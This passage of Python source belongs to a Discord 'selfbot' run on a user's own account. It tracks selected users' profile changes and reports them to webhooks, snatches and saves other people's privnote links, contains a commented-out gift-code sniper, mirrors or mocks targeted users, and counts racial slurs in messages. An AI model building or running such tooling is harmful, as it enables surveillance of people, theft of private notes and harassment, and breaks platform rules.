                    if json.load(open('config.json', encoding='utf-8'))['nickname_update_sound'] == True:
                        try:
                            playsound.playsound("./Sound/information.mp3")
                        except:
                            pass

                    payload = json.dumps({
                            "embeds": [
                                {
                                "title": "React Detection Webhook",
                                "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                                "thumbnail": {
                                    "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                                },
                                "description": "Detected nickname update",
                                "fields": [
                                    {
                                    "name": "__ü•û Before__",
                                    "value": f'{before.nick}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__üçú After__",
                                    "value": f'{after.nick}',
                                    "inline": "true"
                                    },
                                    {
                                    "name": "__üõã Server__",
                                    "value": f'{after.guild.name}',
                                    "inline": "true"
                                    }
                                ],
                                "footer": {
                                    "text": "React Selfbot"
                                }
                                }
                            ]
                            })

                    try:
                        requests.post(json.load(open('config.json', encoding='utf-8'))['nickname_update_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                    except Exception:
                        pass

                    try:
                        if json.load(open('config.json', encoding='utf-8'))['nickname_update_notify'] and sys.platform == "win32":
                            toaster.show_toast("Nickname Update Detection", f"Before: {before.nick} \nAfter: {after.nick} \nServer: {after.guild.name}", icon_path="react.ico", duration=2)
                    except:
                        pass
                    
            pass
        await check_for_nickname_updates()
    
    @React.listen()
    async def on_user_update(before, after):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)

        watch_users = []
        for _id in data['watched_users']:
            watch_users.append(_id)
            
        if after not in watched_users and after.id in watch_users and before.avatar != after.avatar:
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Watcher | ' + fg.purple3 + '{}#{} has changed his avatar'.format(after.name, after.discriminator))
            payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Watcher Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected User Change",
                        "fields": [
                            {
                            "name": "__üß¨ User__",
                            "value": f'{before.name}#{before.discriminator}',
                            "inline": "true"
                            },
                            {
                            "name": "__üö¥ Type__",
                            "value": f'Avatar Change',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['watcher_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass
            
        if after not in watched_users and before.id in watch_users and (before.name != after.name or before.discriminator != after.discriminator):
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Watcher | ' + fg.purple3 + '{}#{} has changed his username to {}#{}'.format(before.name, before.discriminator, after.name, after.discriminator))
            payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Watcher Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected User Change",
                        "fields": [
                            {
                            "name": "__üß¨ User__",
                            "value": f'{before.name}#{before.discriminator}',
                            "inline": "true"
                            },
                            {
                            "name": "__üö¥ Type__",
                            "value": f'Username change to: {after.name}#{after.discriminator}',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['watcher_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass

    @React.command(usage="watchuser <User>", description="Notifies you when an user changes his activity, online status, avatar or username")
    async def watchuser(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Watcher',timestamp=embed_timestamp())
        embed.add_field(name=f'Watching user', value=f"{user.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            idarray = []
            for _id in data['watched_users']:
                idarray.append(_id)
            
            if user.id not in idarray:
                idarray.append(user.id)
                
            data['watched_users'] = idarray
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

        except Exception:
            pass

    @React.command(usage="giveawaybotadd <Bot> <Emoji>", description="Adds a bot to the Giveaway sniper list")
    async def giveawaybotadd(ctx, bot: discord.User, emoji: str):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Giveaway Bots',timestamp=embed_timestamp())
        embed.add_field(name=f'Giveaway Bot', value=f"{bot.mention}", inline=True)
        embed.add_field(name=f'Emoji', value=f"{emoji}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("GiveawayBots.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            data[bot.id] = emoji
            
            with open("GiveawayBots.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

        except Exception as e:
            print(e)
    
    @React.command(usage="unwatchuser <User>", description="Stops watching an user")
    async def unwatchuser(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Watcher',timestamp=embed_timestamp())
        embed.add_field(name=f'Unwatched user', value=f"{user.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            idarray = []
            for _id in data['watched_users']:
                idarray.append(_id)
            
            if user.id in idarray:
                idarray.remove(user.id)
                
            data['watched_users'] = idarray
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

        except Exception:
            pass
        
    @React.command(usage="unwatchall", description="Stops watching all users")
    async def unwatchall(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Watcher', description=f'Not watching anyone anymore.',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['watched_users'] = []
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

        except Exception:
            pass
    
    @React.command(usage="snipe", description="Shows the last deleted message")
    async def snipe(ctx):
        if snipe_message_content == None:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Snipe', description='There is nothing to snipe.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Snipe',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name='Message Author', value=f'{snipe_message_author}', inline=False)
            embed.add_field(name='Message Content', value=f'{snipe_message_content}', inline=False)
            embed.add_field(name='Server', value=f'{snipe_message_server}', inline=False)
            embed.add_field(name='Message ID', value=f'{snipe_message_id}', inline=False)
            await embed_or_codeblock(ctx, embed)

    
    @React.listen()
    async def on_message(msg):
        # if json.load(open('config.json', encoding='utf-8'))['nitro_sniper'] == True and nitroRegex.search(msg.content) and msg.channel not in ignored_nitro_channels:
        #     code = nitroRegex.search(msg.content).group(2)
        #     if len(code) >= 16 and code not in already_redeemed:
        #         async with httpx.AsyncClient() as client:    
        #             start_time = time.time()
        #             result = await client.post(f'https://canary.discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': msg.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        #             elapsed = '%.3fs' % (time.time() - start_time)
                
        #         status = 'Ratelimit'
        #         web_status = 'None'
        #         ping = False
        #         if 'This gift has been redeemed already' in str(result.content):
        #             status = f'{fg.red}Already redeemed'
        #             web_status = 'Already redeemed'
        #         elif 'nitro' in str(result.content):
        #             status = f'{fg.green}Successfully redeemed!'
        #             web_status = 'Successfully redeemed!'
        #             ping = True
        #         elif 'Unknown Gift Code' in str(result.content):
        #             status = f'{fg.yellow}Unknown/Invalid'
        #             web_status = 'Unknown/Invalid'

        #         print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro')                
        #         print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Elapsed: {fg.white}{elapsed}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {status}")
        #         already_redeemed.append(code)
        #         if ping:
        #             if json.load(open('config.json', encoding='utf-8'))['nitro_redeem_notify'] and sys.platform == "win32":
        #                 try:
        #                     toaster.show_toast("Nitro Sniper", f"Successfully redeemed a Nitro code! \nServer: {msg.guild} \nAuthor: {msg.author}\nChannel: {msg.channel}", icon_path="react.ico", duration=2)
        #                 except:
        #                     pass
        #             payload = json.dumps({
        #             "content": f"<@{React.user.id}>",
        #             "embeds": [
        #                 {
        #                 "title": "React Nitro Sniper Webhook",
        #                 "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
        #                 "thumbnail": {
        #                     "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
        #                 },
        #                 "fields": [
        #                     {
        #                     "name": "__üç≠ Code__",
        #                     "value": f'{code}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__‚è± Time Elapsed__",
        #                     "value": f'{elapsed}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üéÄ Status__",
        #                     "value": f'{web_status}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üß¨ Author__",
        #                     "value": f'{msg.author}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üõã Server__",
        #                     "value": f'{msg.guild}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__ü•§ Channel__",
        #                     "value": f'{msg.channel}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üîó Jump to channel__",
        #                     "value": f'[Jump URL]({msg.jump_url})',
        #                     "inline": "true"
        #                     }
        #                 ],
        #                 "footer": {
        #                     "text": "React Selfbot"
        #                 }
        #                 }
        #             ]
        #             })
        #         else:
        #             payload = json.dumps({
        #             "embeds": [
        #                 {
        #                 "title": "React Nitro Sniper Webhook",
        #                 "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
        #                 "thumbnail": {
        #                     "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
        #                 },
        #                 "fields": [
        #                     {
        #                     "name": "__üç≠ Code__",
        #                     "value": f'{code}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__‚è± Time Elapsed__",
        #                     "value": f'{elapsed}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üéÄ Status__",
        #                     "value": f'{web_status}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üß¨ Author__",
        #                     "value": f'{msg.author}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üõã Server__",
        #                     "value": f'{msg.guild}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__ü•§ Channel__",
        #                     "value": f'{msg.channel}',
        #                     "inline": "true"
        #                     },
        #                     {
        #                     "name": "__üîó Jump to channel__",
        #                     "value": f'[Jump URL]({msg.jump_url})',
        #                     "inline": "true"
        #                     }
        #                 ],
        #                 "footer": {
        #                     "text": "React Selfbot"
        #                 }
        #                 }
        #             ]
        #             })

        #         try:
        #             requests.post(json.load(open('config.json', encoding='utf-8'))['nitro_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
        #         except Exception:
        #             pass

        #     else:
        #         print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro')                    
        #         print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
        #             f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {fg.red}Fake")                        
        
        # if msg.author == React.user:

        #     await React.process_commands(msg)
                        
        await check_for_privnote(msg)
        
        if isinstance(msg.channel, discord.DMChannel) and json.load(open('config.json', encoding='utf-8'))['block_dms']:
            requests.delete(f"https://canary.discord.com/api/v8/channels/{msg.channel.id}", headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        
        if msg.author.id in remote_selfbot_users:
            if msg.content.startswith(json.load(open("config.json", encoding="utf-8"))["prefix"]) and ("@everyone" or "@here" not in msg.content):
                await msg.channel.send(msg.content)

        def count_occurrences(word, sentence):
            return sentence.count(word)

        nigga_count = count_occurrences("nigga", msg.content.lower())
        nigger_count = count_occurrences("nigger", msg.content.lower())
        global nwordcounter
        nwordcounter = nwordcounter + nigga_count
        nwordcounter = nwordcounter + nigger_count

        try:
            
            if msg.author in copyarray:
                if msg.content.startswith(json.load(open("config.json", encoding="utf-8"))["prefix"]):
                    pass
                else:
                    await msg.channel.send(msg.content)
                    
            if msg.author in mockarray:
                if msg.content.startswith(json.load(open("config.json", encoding="utf-8"))["prefix"]):
                    pass
                else:
                    try:
                        random.seed(msg.author.id)
                        message = ''
                        last_was_upper = True
                        swap_chance = 0.5
                        for c in msg.content:
                            if c == '?':
                                if random.random() < 0.5:
                                    c = '¬ø'
                            
                            if c == '!':
                                if random.random() < 0.5:
                                    c = '¬°'
                            
                            if c.isalpha():
                                if random.random() < swap_chance:
                                    last_was_upper = not last_was_upper
                                    swap_chance = 0.5
                                c = c.upper() if last_was_upper else c.lower()
                                swap_chance += (1-swap_chance)*0.7
                            message += c
                        
                        await msg.channel.send(message)
                    except Exception:
                        pass
            
                    
            if json.load(open('config.json', encoding='utf-8'))['ignore_pings'] == True:
                if '@everyone' in msg.content:
                    await msg.ack()
                elif '@here' in msg.content:
                    await msg.ack()
                    
            if msg.author in ignored_users:
                await msg.ack()

            if msg.author in semi_muted:
                await msg.delete()
            
            if json.load(open('config.json', encoding='utf-8'))['ignore_all_pings'] == True:
                if React.user.mentioned_in(msg):
                    await msg.ack()
            
            if uwu_stat == 1:
                if msg.author == React.user:
                    try:
                        if 'uwumode' in str(msg.content) or re.findall(r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+", str(msg.content)):
                            return
                        elif msg.content.startswith(json.load(open("config.json", encoding="utf-8"))["prefix"]):
                            return
                        elif 'L' or 'R' or 'O' or 'l' or 'r' or 'o' in str(msg.content):
                            await msg.edit(content=UwUText(msg.content))
                    except Exception:
                        pass
                            
            if mock_stat == 1:
                if msg.author == React.user and not re.findall(r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+", str(msg.content)) and not (json.load(open("config.json", encoding="utf-8"))["prefix"] + "mockmode") in str(msg.content).lower():
                    random.seed(msg.author.id)
                    message = ''
                    last_was_upper = True
                    swap_chance = 0.5
                    for c in msg.content:
                        if c == '?':
                            if random.random() < 0.5:
                                c = '¬ø'
                        
                        if c == '!':
                            if random.random() < 0.5:
                                c = '¬°'
                        
                        if c.isalpha():
                            if random.random() < swap_chance:
                                last_was_upper = not last_was_upper
                                swap_chance = 0.5
                            c = c.upper() if last_was_upper else c.lower()
                            swap_chance += (1-swap_chance)*0.7
                        message += c
                    
                    await msg.edit(content=message)
            
            if afk_stat == 1:
                with open('config.json', encoding='utf-8') as config:
                    afkmessage = json.load(config)['afk_message']
                    if afkmessage == '':
                        afkmessage = 'I\'m currently afk and unreachable, please try to contact me later.'

                if msg.guild is None:
                    if msg.author == React.user:
                        return
                    if not msg.author in afk_messaged_people:
                        afk_messaged_people.append(msg.author)
                        await msg.channel.send(afkmessage)
                    
            if msg.author == React.user:
                with open("CustomCommands.json", "r") as jsonFile:
                    data = json.load(jsonFile)
                    
                if data[msg.content]:
                    
                    command_output = data[msg.content]
                    
                    await msg.delete()
                    
                    await msg.channel.send(command_output)
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Command Used | ' + fg.purple3 + str(msg.content))
        except:
            pass
        
        if not isinstance(msg.channel, discord.DMChannel):
            await check_for_giveaway(msg)
            await check_for_giveaway_win(msg)
        
    async def check_for_privnote(msg):
        if json.load(open('config.json', encoding='utf-8'))['privnote_sniper'] == True and 'privnote.com' in msg.content:
            try:
                start = time.time()
                code = re.search('privnote.com/(.*)', msg.content).group(1)
                link = f'https://privnote.com/{code}'
                try:
                    note_text = pn.read_note(link)
                except Exception:
                    return
                privnotepath = os.getcwd() + r'/Privnotes'
                if not os.path.isdir(privnotepath):
                    os.mkdir(privnotepath)
                open( f'./Privnotes/Privnote-{code}.txt', 'a').close()
                with open(f'./Privnotes/Privnote-{code}.txt', 'w') as data:
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Privnote')      
                    elapsed = time.time() - start
                    elapsed = '%.3fs' % elapsed
                    data.write(note_text)
                    print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Elapsed: {fg.white}{elapsed}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Content: {fg.white}Privnote content is saved in Privnote/{code}.txt")
                    
                if json.load(open('config.json', encoding='utf-8'))['privnote_snipe_notify'] and sys.platform == "win32":
                    try:
                        toaster.show_toast("Privnote Sniper", f"You sniped a Privnote!", icon_path="react.ico", duration=2)
                    except:
                        pass
                    
                payload = json.dumps({
                "content": f"<@{React.user.id}>",
                "embeds": [
                    {
                    "title": "React Privnote Sniper Webhook",
                    "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                    "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                    "fields": [
                        {
                        "name": "__üç≠ Code__",
                        "value": f'{code}',
                        "inline": "true"
                        },
                        {
                        "name": "__üõã Server__",
                        "value": f'{msg.guild}',
                        "inline": "true"
                        },
                        {
                        "name": "__üß¨ Author__",
                        "value": f'{msg.author}',
                        "inline": "true"
                        },
                        {
                        "name": "__ü•§ Channel__",
                        "value": f'{msg.channel}',
                        "inline": "true"
                        },
                        {
                        "name": "__‚è± Time Elapsed__",
                        "value": elapsed,
                        "inline": "true"
                        },
                        {
                        "name": "__‚úâÔ∏è Content__",
                        "value": f'{note_text}',
                        "inline": "true"
                        },
                        {
                        "name": "__üîó Jump to channel__",
                        "value": f'[Jump URL]({msg.jump_url})',
                        "inline": "true"
                        }
                    ],
                    "footer": {
                        "text": "React Selfbot"
                    }
                    }
                ]
                })

                try:
                    requests.post(json.load(open('config.json', encoding='utf-8'))['privnote_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                except Exception:
                    pass

                if json.load(open('config.json', encoding='utf-8'))['privnote_sound'] == True:
                    try:
                        playsound.playsound("./Sound/success.mp3")
                    except:
                        pass

            except Exception:
                return

    async def check_for_giveaway_win(msg):
        custom_giveaway_bot_ids = []
        try:
            if os.path.exists('GiveawayBots.json'):
                with open("GiveawayBots.json", "r", encoding="utf-8") as jsonFile:
                    data = json.load(jsonFile)
                
                for key, value in data.items():
                    try:
                        custom_giveaway_bot_ids.append(int(key))
                    except Exception:
                        pass
        except Exception:
            pass

        if '<@' + str(React.user.id) + '>' in msg.content and ('giveaway' in str(msg.content).lower() or ' won ' in msg.content or ' winner ' in str(msg.content).lower()) and msg.author.bot and msg.author.id in custom_giveaway_bot_ids:            
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Giveaway Win')            
            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}")
            
            if json.load(open('config.json', encoding='utf-8'))['giveaway_win_notify'] and sys.platform == "win32":
                try:
                    toaster.show_toast("Giveaway Sniper", f"You won a giveaway in {msg.guild}!", icon_path="react.ico", duration=2)
                except:
                    pass
            
            payload = json.dumps({
            "content": f"<@{React.user.id}>",
